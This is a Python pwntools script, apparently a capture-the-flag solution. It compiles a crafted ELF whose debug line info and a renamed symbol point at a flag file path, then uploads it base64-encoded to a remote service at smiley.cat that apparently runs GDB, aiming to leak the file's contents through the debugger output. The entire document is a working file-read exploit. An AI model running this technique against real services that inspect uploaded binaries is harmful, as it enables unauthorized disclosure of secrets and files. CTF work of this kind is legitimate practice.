#!/usr/bin/env python3
from pwn import *
from base64 import b64encode
import subprocess
from tempfile import TemporaryDirectory

context.log_level = 'debug'
HOST = 'smiley.cat'
PORT = 42699

with TemporaryDirectory() as tmpdir:
    flag_c = f"{tmpdir}/flag.c"
    main_c = f"{tmpdir}/main.c"
    obj = f"{tmpdir}/flag.o"
    elf = f"{tmpdir}/exp.elf"

    with open(flag_c, "w") as f:
        f.write('#line 1 "/srv/app/flag.txt"\n')
        f.write('__attribute__((used)) void dummy() {}\n')

    with open(main_c, "w") as f:
        f.write('int main() { return 0; }\n')

    subprocess.run(["gcc", "-g", "-O0", "-c", flag_c, "-o", obj], check=True)

    subprocess.run(["objcopy", "--redefine-sym=dummy=/app/flag.txt", obj], check=True)

    subprocess.run(["gcc", "-no-pie", main_c, obj, "-o", elf], check=True)

    with open(elf, "rb") as f:
        b64_elf = b64encode(f.read())

p = remote(HOST, PORT)
p.sendlineafter(b"elf: ", b64_elf)
output = p.recvall(timeout=5).decode(errors="ignore")

print("\n=== GDB OUTPUT ===")
print(output)
